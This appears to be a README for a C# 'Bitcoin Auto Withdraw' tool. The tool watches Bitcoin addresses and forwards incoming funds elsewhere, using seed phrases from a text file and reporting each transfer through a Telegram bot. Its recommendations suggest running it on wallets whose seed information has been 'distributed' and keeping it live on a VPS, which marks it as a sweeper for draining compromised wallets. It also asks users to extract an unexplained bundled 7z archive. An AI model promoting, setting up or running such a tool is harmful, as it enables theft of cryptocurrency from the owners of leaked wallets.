# Bitcoin Auto Withdraw

This Tool is a tool used to perform automatic withdrawals as soon as money arrives in Bitcoin wallets. In particular, it ensures that transfers to a specific Bitcoin address are automatically routed to a specific address.

## Installation
- **Extract the packages.7z archive (to avoid getting an error)**
- Open the solution file (.sln).
- Replace `YOUR_TELEGRAM_BOT_TOKEN`, `YOUR_CHAT_ID` and `YOUR_BTC_ADDRESS` in `Program.cs` with your own information.
- Select **Build Solution** from the **Build** menu to compile the project or select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
- Add seed to the `./Release\address.txt` file in the main directory of the project.
- Runs it.

## Requirements

- Visual Studio 2022
- .NET Core SDK 3.1 or higher
- NBitcoin and NBitcoin.RPC packages
- TelegramBot packages
- Costura packages 

## Usage

When the project is running, it tracks each transfer to a specific address in your Bitcoin wallet. If a transfer occurs to the specified address, it automatically sends that transfer to another address.

## Settings

The `address.txt` file in the project contains seed expressions and their corresponding Bitcoin addresses. You can edit this file with any text editor. Also, to receive notifications via Telegram, you need to create a bot and write your bot and target chat ID in the places specified in the `Program.cs` file.

## Recommendations

- Connect a Specific VPS/VDS to Keep it Active After Compiling the Code.
- You can use this code on wallets with seed information distributed.
- If you want to test the code yourself, try it with small quantities.

## Contribution

If you would like to contribute to this project, please leave a star in the repo.

## Disclaimer

No liability arising from the use or misuse of this software is accepted. Users must use this software at their own risk.

## License

This project is licensed under the MIT. For more information, see the [License](LICENSE).
